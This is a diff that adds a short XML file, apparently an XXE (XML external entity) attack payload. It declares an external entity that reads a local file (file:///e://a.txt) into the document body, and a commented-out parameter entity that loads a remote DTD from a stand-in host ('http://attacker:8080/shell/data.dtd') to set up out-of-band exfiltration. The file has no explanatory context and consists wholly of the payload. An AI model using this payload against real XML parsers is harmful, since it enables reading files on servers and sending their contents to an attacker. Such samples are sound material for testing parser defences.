@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY  attack SYSTEM "file:///e://a.txt">
+
+<!--
+<!ENTITY % xxe SYSTEM "http://attacker:8080/shell/data.dtd">
+%xxe;
+-->
+
+]>
+
+ <abc>&attack;</abc>
